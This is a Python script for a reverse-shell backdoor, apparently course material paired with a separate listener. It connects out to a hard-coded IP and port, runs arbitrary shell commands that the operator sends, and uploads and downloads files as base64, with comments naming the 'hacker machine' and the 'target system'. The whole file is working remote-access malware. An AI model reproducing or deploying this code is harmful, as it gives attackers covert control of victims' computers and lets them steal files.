#!/usr/bin/env python
#needs the listener.py (client-server)

import socket, subprocess, json, os, base64, sys

class Backdoor:
    def __init__(self, ip, port):
        # object for a socket created
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # connect to a destination socket (mine)
        self.connection.connect((ip, port))

    def change_working_dir_to(selfs, path):
        os.chdir(path)
        return  "[+] Changing working directory to " + path

    # serialization
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data=b""
        while True:
            try:
                json_data =json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        DEVNULL=open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successful."

    def run(self):
        # send and receive data
        while True:
            command = self.reliable_receive()
            try:
                if command[0]=="exit":
                    self.connection.close()
                    sys.exit()
                elif command[0]=="cd" and len(command) > 1:
                    command_result=self.change_working_dir_to(command[1])
                elif command[0]=="download":
                    command_result=self.read_file(command[1]).decode()
                elif command[0]=="upload":
                    command_result=self.write_file(command[1],command[2])
                else:
                    # execute commands on target system
                    command_result = self.execute_system_command(command).decode()
            except Exception:
                command_result="[-] Error during command execution"
            # send result to hacker machine
            self.reliable_send(command_result)

#run to another class
import reverse_backdoor
my_backdoor=Backdoor("10.10.10.16", 4444)
my_backdoor.run()
